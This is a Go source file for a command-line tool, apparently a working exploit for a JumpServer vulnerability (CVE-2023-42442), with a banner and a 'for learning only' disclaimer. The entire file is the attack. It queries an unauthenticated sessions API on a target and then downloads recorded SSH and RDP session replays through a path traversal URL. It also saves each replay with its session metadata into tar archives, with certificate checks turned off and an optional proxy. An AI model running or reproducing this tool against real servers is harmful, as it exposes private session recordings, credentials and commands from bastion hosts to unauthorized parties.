package main

import (
	"archive/tar"
	"compress/gzip"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/go-resty/resty/v2"
	log "github.com/sirupsen/logrus"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type Sessions struct {
	ID              string    `json:"id"`
	User            string    `json:"user"`
	Asset           string    `json:"asset"`
	UserID          string    `json:"user_id"`
	AssetID         string    `json:"asset_id"`
	Account         string    `json:"account"`
	AccountID       string    `json:"account_id"`
	Protocol        string    `json:"protocol"`
	Type            Type      `json:"type"`
	LoginFrom       LoginFrom `json:"login_from"`
	RemoteAddr      string    `json:"remote_addr"`
	Comment         string    `json:"comment"`
	TerminalDisplay string    `json:"terminal_display"`
	IsLocked        bool      `json:"is_locked"`
	CommandAmount   int       `json:"command_amount"`
	Terminal        Terminal  `json:"terminal"`
	OrgID           string    `json:"org_id"`
	OrgName         string    `json:"org_name"`
	IsSuccess       bool      `json:"is_success"`
	IsFinished      bool      `json:"is_finished"`
	HasReplay       bool      `json:"has_replay"`
	HasCommand      bool      `json:"has_command"`
	CanReplay       bool      `json:"can_replay"`
	CanJoin         bool      `json:"can_join"`
	CanTerminate    bool      `json:"can_terminate"`
	DateStart       string    `json:"date_start"`
	DateEnd         string    `json:"date_end"`
}

type Type struct {
	Value string `json:"value"`
	Label string `json:"label"`
}

type LoginFrom struct {
	Value string `json:"value"`
	Label string `json:"label"`
}

type Terminal struct {
	ID   string `json:"id"`
	Name string `json:"name"`
	Type string `json:"type"`
}

var PROXIES string

func init() {
	// 配置日志格式
	log.SetFormatter(&log.TextFormatter{
		ForceColors:               true,
		EnvironmentOverrideColors: true,                  // 显示颜色
		TimestampFormat:           "2006-01-02 15:04:05", // 格式化时间
		FullTimestamp:             true,
		DisableLevelTruncation:    true,
	})

	// 设置日志级别为: Info
	log.SetLevel(log.InfoLevel)
}

func banner() {
	fmt.Println(`

	██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗██████╗ ██╗  ██╗██╗  ██╗██████╗
	██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║╚════██╗██║  ██║██║  ██║╚════██╗
	██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║ █████╔╝███████║███████║ █████╔╝
	██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║██╔═══╝ ╚════██║╚════██║██╔═══╝
	╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝           ██║███████╗     ██║     ██║███████╗
	╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝╚══════╝     ╚═╝     ╚═╝╚══════╝

	@Auth: C1ph3rX13
	@Blog: https://c1ph3rx13.github.io
	@Note: 代码仅供学习使用，请勿用于其他用途
	`)
}

func createClient() *resty.Client {
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	}

	// 配置 client
	client := resty.New().
		SetHeaders(headers).
		SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) // 忽略证书

	// 配置代理
	if PROXIES != "" {
		client.SetProxy(PROXIES)
	}

	return client
}

func checkAPI(target string, client *resty.Client) ([]Sessions, bool) {
	sessionsURL := target + "/api/v1/terminal/sessions/"
	// 发起请求，将响应结果解析为 Sessions 结构体数组类型
	replayJSON := make([]Sessions, 0)
	resp, err := client.R().
		SetResult(&replayJSON).
		Get(sessionsURL)
	if err != nil {
		log.Panicf("Check API Request Error: %v", err)
	}

	if resp.StatusCode() == 200 && strings.Contains(resp.String(), "id") {
		log.Warningf("Vulnerable: [%v]", resp.Request.URL)
		log.Infof("Found %v Sessions", len(replayJSON))
		for i := range replayJSON {
			log.Infof("ID:[%s] Protocol:[%s] CanReplay:[%v] DateStart:[%v]", replayJSON[i].ID, replayJSON[i].Protocol, replayJSON[i].CanReplay, replayJSON[i].DateStart)
		}
		return replayJSON, true
	}
	log.Warningf("Not Vulnerable: [%v]", resp.Request.URL)
	return nil, false
}

func getReplayExtension(protocol string) string {
	if strings.ToLower(protocol) == "rdp" {
		return ".replay.gz"
	} else {
		return ".cast.gz"
	}
}

func exploit(target string, jsonData []Sessions, folderPath string, client *resty.Client) {
	// 判断是否存在回放文件
	for _, replayInfo := range jsonData {
		if replayInfo.CanReplay == false {
			log.Warnf("Session [%v] has no replay", replayInfo.ID)
			continue
		}

		// 判断系统类型
		replayExt := getReplayExtension(replayInfo.Protocol)

		// 时间转换
		parsedTime, err := time.Parse("2006/01/02 15:04:05 -0700", replayInfo.DateStart)
		if err != nil {
			log.Fatalf("Time conversion failed: %v", err)
		}
		formattedDate := parsedTime.Format("2006-01-02")

		// 发起下载请求
		replayURL := target + "/media/xpack/../replay/" + formattedDate + "/" + replayInfo.ID + replayExt
		resp, err := client.R().Get(replayURL)
		if err != nil {
			log.Fatalf("Request failed: %v", err)
		}

		// CreateGzAddToTar
		err = CreateGzAddToTar(resp.Body(), jsonData, folderPath, replayInfo.ID, replayExt)
		if err != nil {
			log.Fatalf("Compressing to GZfile error: %v", err)
		} else {
			log.Infof("Replay file conversion completed successfully: [%v]", replayInfo.ID)
		}

		err = resp.RawBody().Close()
		if err != nil {
			log.Fatalf("RawBody Close Error: %v", err)
		}

	}
}

func SaveJSONFile(jsonData []Sessions, sessionID, folderPath string) error {
	filename := filepath.Join(folderPath, sessionID+".json")
	file, err := os.Create(filename)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return nil
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	err = encoder.Encode(jsonData)
	if err != nil {
		fmt.Println("Error encoding JSON:", err)
		return nil
	}

	return nil
}

func CreateGzAddToTar(respBody []byte, jsonData []Sessions, folderPath, sessionID, replayExt string) error {
	// 创建GZ文件，读取文件路径
	gzPath := filepath.Join(folderPath, sessionID)
	// 创建文件
	gzFile, err := os.Create(gzPath + replayExt)
	if err != nil {
		return err
	}
	defer func(gzFile *os.File) {
		err := gzFile.Close()
		if err != nil {
			log.Errorf("Failed to close gzfile: %v", err)
		}
	}(gzFile)

	// 创建gzip.Writer，并设置文件名
	gzipWriter := gzip.NewWriter(gzFile)
	gzipWriter.Header.Name = sessionID

	// 将数据写入GZ文件
	if _, err = gzipWriter.Write(respBody); err != nil {
		return err
	}

	// 必须关闭 gzip.Writer，否则无法写入数据
	if err := gzipWriter.Close(); err != nil {
		log.Errorf("failed to close gzip.Writer: %v", err)
	}

	// 创建tar文件
	tarPath := filepath.Join(folderPath, sessionID+".tar")
	tarFile, err := os.Create(tarPath)
	if err != nil {
		log.Fatalf("Failed to create tar file: %v", err)
	}
	defer tarFile.Close()

	tarWriter := tar.NewWriter(tarFile)
	defer tarWriter.Close()

	// 获取 sessionID.json
	err = SaveJSONFile(jsonData, sessionID, folderPath)
	if err != nil {
		return err
	}

	// 添加 sessionID.json
	sessionIDJSON := filepath.Join(folderPath, sessionID+".json")
	if err = addFileToTar(sessionIDJSON, tarWriter); err != nil {
		log.Fatalf("Adding JSON file to tar fails: %v", err)
	}
	if err = os.Remove(sessionIDJSON); err != nil {
		log.Errorf("Remove JSON error: %v", err)
	}

	// 添加 sessionID.cast.gz
	sessionIDGZ := filepath.Join(folderPath, sessionID+replayExt)
	if err = addFileToTar(sessionIDGZ, tarWriter); err != nil {
		log.Fatalf("Adding cast.gz file to tar fails: %v", err)
	}

	return nil
}

func addFileToTar(filePath string, tarWriter *tar.Writer) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return err
	}

	header := &tar.Header{
		Name:    filepath.Base(filePath),
		Mode:    int64(stat.Mode()),
		Size:    stat.Size(),
		ModTime: stat.ModTime(),
	}

	err = tarWriter.WriteHeader(header)
	if err != nil {
		return err
	}

	if _, err = io.Copy(tarWriter, file); err != nil {
		return err
	}

	return nil
}

func createFolderFromURL(urlStr string) (string, error) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return "", err
	}

	hostname := parsedURL.Hostname()
	if hostname == "" {
		return "", err
	}

	folderPath := filepath.Join(".", hostname)

	_, err = os.Stat(folderPath)
	if os.IsNotExist(err) {
		err := os.Mkdir(folderPath, 0777)
		if err != nil {
			return "", err
		}
	} else if err != nil {
		return "", err
	}

	return folderPath, nil
}

func RemoveGzFiles(folderPath string) error {
	// 获取当前目录下所有的.gz后缀文件
	gzFiles, err := filepath.Glob(filepath.Join(folderPath, "*.gz"))
	if err != nil {
		return err
	}

	// 删除所有的.gz文件
	for _, gzFile := range gzFiles {
		err := os.Remove(gzFile)
		if err != nil {
			return err
		}
	}

	return nil
}

func run(target string) {
	client := createClient()

	// 定义文件保存路径
	folderPath, err := createFolderFromURL(target)
	if err != nil {
		log.Fatalf("Failed to create folder: %v", err)
	} else {
		log.Infof("Folder already exists or created successfully: %s", folderPath)
	}

	data, result := checkAPI(target, client)
	if result == true {
		exploit(target, data, folderPath, client)
		if err = RemoveGzFiles(folderPath); err != nil {
			log.Infof("Error: %v", err)
		}
	}

}

func main() {
	banner()
	target := flag.String("t", "", "Target Url")
	proxy := flag.String("proxy", "", "Proxy Url")

	flag.Parse()

	if *target == "" {
		log.Error("Missing required arguments.")
		flag.Usage()
		return
	}

	if *proxy != "" {
		PROXIES = *proxy
	}

	run(*target)
}
